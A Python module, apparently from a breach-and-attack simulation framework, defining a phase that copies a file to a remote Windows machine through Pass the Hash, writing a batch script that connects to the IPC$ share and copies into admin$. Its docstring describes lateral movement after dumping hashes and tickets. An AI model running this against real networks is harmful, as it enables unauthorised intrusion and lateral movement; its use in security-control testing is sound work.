from ai_utils.phases.abstract_phase import AbstractPhaseClass
from ai_utils.utils.offensive.pass_the_hash import PassTheHashUtilsClass
from ai_utils.scenarios.globals import FileUtils, PathUtils
import logging
import re
try:
  import aipythonlib
except Exception as e:
  logging.error('Error importing aipythonlib: {0}'.format(e))


class CopyFileToRemoteMachinePhaseClass(AbstractPhaseClass):
  """This phase copies a local file to a remote machine using the credentials provided as parameters.

  In order to authenticate to the remote machine, the Pass the Hash technique is used.
  Using this approach, this phase can be used to move laterally to another network machine once one machine has been
  compromised. The approach that an attacker would take is to dump all the passwords available in the compromised
  machine, being them clear text passwords, NTLM hashes, Kerberos tickets, etc and try each of them in order to gain
  access to another machine in the network. The next step would be to move files to the new machine in order to gather
  more information about the system. This phase mimics this last step.

    Args:
       isPhaseCritical (bool):  If the phase is critical.
       targetMachine (str):  The IP of the machine in which the file will be copied.
       credentialObject (dict):  Dictionary containing keys 'domain', 'user' and 'password'. All values being strings
                                 and password being a NTLM hash.
       srcFile (str):  The source filename to copy to the target machine. e.g. c:\windows\sytem32\notepad.exe
       dstFile (str):  The destination filename where the source file will be copied. This file should be passed in a
                       way that can be added to \\IP\{dest_filename}. e.g. admin$\sytem32\copied_notepad.exe

    Kwargs:
       timeout (int):  The number of milliseconds that the copy operation has in order to succeed. e.g. 5000

    Returns:
       bool.  True if phase has been successful, False otherwise.
  """
  TrackerId = "514"
  Subject = "Copy File to Remote Machine"
  Description = "This phase transfers a file to a remote machine"

  def __init__(self, isPhaseCritical, targetMachine, credentialObject, srcFile, dstFile, timeout=60000):
    AbstractPhaseClass.__init__(self, isPhaseCritical)
    logging.info(Messages.INFO12)
    self.TargetMachine = self._SetupTargetMachine(targetMachine)
    self.Domain = self._SetupDomain(credentialObject)
    self.Username = self._SetupUser(credentialObject)
    self.PasswordHash = self._SetupPassword(credentialObject)
    self.SrcFilename = self._SetupSrcFilename(srcFile)
    self.DstFilename = self._SetupDstFilename(dstFile)
    self.Timeout = self._SetupTimeout(timeout)
    self.TestSuccessPattern = self._SetupTestSuccessPattern()
    self.CommandOutputLogPath = self._SetupCommandOutputLog()
    self.CommandScript = self._SetupCommandScript()
    self.CommandOutput = ''
    self.FileAlreadyExists = False

  def Setup(self):
    if not self.TargetMachine:
      self.PhaseReporter.Error(Messages.ERROR1)
      return False
    if not self.Domain:
      self.PhaseReporter.Error(Messages.ERROR2)
      return False
    if not self.Username:
      self.PhaseReporter.Error(Messages.ERROR3)
      return False
    if not self.PasswordHash:
      self.PhaseReporter.Error(Messages.ERROR4)
      return False
    if not self.SrcFilename:
      self.PhaseReporter.Error(Messages.ERROR5)
      return False
    if not self.DstFilename:
      self.PhaseReporter.Error(Messages.ERROR6)
      return False
    if not self.CommandScript:
      self.PhaseReporter.Error(Messages.ERROR7)
      return False
    if not self.CommandOutputLogPath:
      self.PhaseReporter.Error(Messages.ERROR8)
      return False
    return True

  def Cleanup(self):
    if not self.RemoveOutputLog():
      self.PhaseReporter.Warn(Messages.WARN1.format(self.CommandOutputLogPath))
    if not self.RemoveScript():
      self.PhaseReporter.Warn(Messages.WARN2.format(self.CommandScript))
    return True

  def RemoveOutputLog(self):
    return FileUtils.DeleteFile(self.CommandOutputLogPath)

  def RemoveScript(self):
    return FileUtils.DeleteFile(self.CommandScript)

  def Run(self):
    phaseSuccessful = self._CopyFileToRemoteMachine()
    self._LogSuccess(phaseSuccessful)
    return phaseSuccessful

  ###
  # Internal methods
  ##################

  def _CopyFileToRemoteMachine(self):
    self.PhaseReporter.Info(Messages.INFO13)
    success = False
    if PassTheHashUtilsClass.Execute(self.Domain, self.Username, self.PasswordHash, self.CommandScript, self.Timeout):
      success = self._CheckCommandOutput()
    return success

  def _CheckCommandOutput(self):
    self.PhaseReporter.Info(Messages.INFO14)
    success = False
    if self._ReadCommandOutputFile():
      success = self._CheckIfCommandOutputIsCorrect()
      self.FileAlreadyExists = self._CheckIfFileAlreadyExisted()
    return success

  def _ReadCommandOutputFile(self):
    success = False
    if FileUtils.FileExists(self.CommandOutputLogPath):
      success = True
      self.CommandOutput = FileUtils.ReadFromFile(self.CommandOutputLogPath)
    else:
      logging.error(Messages.ERROR9)
    return success

  def _CheckIfCommandOutputIsCorrect(self):
    success = False
    pattern = re.compile(self.TestSuccessPattern)
    if pattern.search(self.CommandOutput):
      success = True
    else:
      logging.error(Messages.ERROR10)
      self.PhaseReporter.Info(Messages.ERROR11.format(self.CommandOutput))
    return success

  def _CheckIfFileAlreadyExisted(self):
    success = False
    pattern = re.compile(r'FILE_EXISTS')
    if pattern.search(self.CommandOutput):
      success = True
      self.PhaseReporter.Info(Messages.INFO17)
    else:
      logging.info(Messages.INFO18)
    return success

  def _LogSuccess(self, phaseSuccessful):
    if phaseSuccessful:
      self.PhaseReporter.Info(Messages.INFO15)
      self.PhaseReporter.Report('A file copy operation was allowed from the local machine to the remote machine using Pass the Hash techique through Mimikatz.')
    else:
      self.PhaseReporter.Info(Messages.INFO16)

  ###
  # Parameter setup
  ##################

  def _SetupTargetMachine(self, targetMachine):
    param = str(targetMachine)
    if param:
      self.PhaseReporter.Info(Messages.INFO1.format(param))
    return param

  def _SetupDomain(self, credentialObject):
    param = str(credentialObject.get('domain', ''))
    if param:
      self.PhaseReporter.Info(Messages.INFO2.format(param))
    return param

  def _SetupUser(self, credentialObject):
    param = str(credentialObject.get('user', ''))
    if param:
      self.PhaseReporter.Info(Messages.INFO3.format(param))
    return param

  def _SetupPassword(self, credentialObject):
    param = str(credentialObject.get('password', ''))
    if param:
      self.PhaseReporter.Info(Messages.INFO11.format(param[:3] + '(redacted)'))
    return param

  def _SetupTimeout(self, timeout):
    param = timeout
    if param:
      self.PhaseReporter.Info(Messages.INFO4.format(param))
    return param

  def _SetupCommandScript(self):
    param = PathUtils.GetTempFile(prefixArg='ai-cmd-', suffixArg='.bat')
    command = self._GetBatchScriptContents()
    with open(param, 'w') as fd:
      fd.write(command)
    logging.info(Messages.INFO5.format(param))
    logging.info(Messages.INFO6.format(command))
    return param

  def _GetBatchScriptContents(self):
    return r"""
    setlocal enabledelayedexpansion

    >{1} 2>&1 (
      echo "Connecting to {0} IPC$ share"
      net use "\\{0}\ipc$"
      echo "Copying file to remote machine (if not exists)"
      if exist "\\{0}\{3}" (echo FILE_EXISTS) else (copy "{2}" "\\{0}\{3}")
      echo "Checking copied file existence in target machine"
      if exist "\\{0}\{3}" echo Pass the Hash Successful
      echo "Disconnecting IPC$"
      net use /delete "\\{0}\ipc$"
    )

    exit /b 0
    """.format(self.TargetMachine, self.CommandOutputLogPath, self.SrcFilename, self.DstFilename)

  def _SetupCommandOutputLog(self):
    param = PathUtils.GetTempFile(prefixArg='ai-cmd-log-', suffixArg='.log')
    if param:
      logging.info(Messages.INFO7.format(param))
    return param

  def _SetupTestSuccessPattern(self):
    param = 'Pass the Hash Successful'
    logging.info(Messages.INFO8.format(param))
    return param

  def _SetupSrcFilename(self, srcFilename):
    param = str(srcFilename)
    if param:
      logging.info(Messages.INFO9.format(param))
    return param

  def _SetupDstFilename(self, dstFilename):
    param = str(dstFilename)
    if param:
      logging.info(Messages.INFO10.format(param))
    return param


class Messages(object):
  INFO1 = 'Target Machine passed as parameter: {0}'
  INFO2 = 'Domain passed as parameter: {0}'
  INFO3 = 'Username passed as parameter: {0}'
  INFO4 = 'Timeout parameter set to: {0}'
  INFO5 = 'Script to be executed: {0}'
  INFO6 = 'Script contents: {0}'
  INFO7 = 'Log filename used to retrieve script execution output: {0}'
  INFO8 = 'Success Pattern value used to check if script execution is successful: {0}'
  INFO9 = 'Source filename passed as parameter: {0}'
  INFO10 = 'Destination filename passed as parameter: {0}'
  INFO11 = 'Password passed as parameter: {0}'
  INFO12 = 'Executing Copy File to Remote Machine phase...'
  INFO13 = 'Copying file to remote machine using provided credentials...'
  INFO14 = 'Checking if command was successful...'
  INFO15 = 'File was successfully copied to remote machine'
  INFO16 = 'Failed to copy file to remote machine'
  INFO17 = 'File already existed in remote machine. It has not been overwritten'
  INFO18 = 'File did not existed in remote machine.'

  WARN1 = 'Command Output Log filename could not be removed. You might want to manually remove it: {0}'
  WARN2 = 'Script filename could not be removed. You might want to manually remove it: {0}'

  ERROR1 = 'Target Machine is required.'
  ERROR2 = 'Domain parameter is required.'
  ERROR3 = 'Username parameter is required.'
  ERROR4 = 'Password parameter is required.'
  ERROR5 = 'Source filename parameter is required.'
  ERROR6 = 'Destination filename parameter is required.'
  ERROR7 = 'Command Script could not be setup. Phase can not continue.'
  ERROR8 = 'Command Output Log Path could not be setup. Phase can not continue.'
  ERROR9 = 'Command output file has not been created. This means that the command has failed.'
  ERROR10 = 'Test Success Pattern could not be found in command output file. Remote command has failed.'
  ERROR11 = 'Command has failed. The output of the command is: {0}'
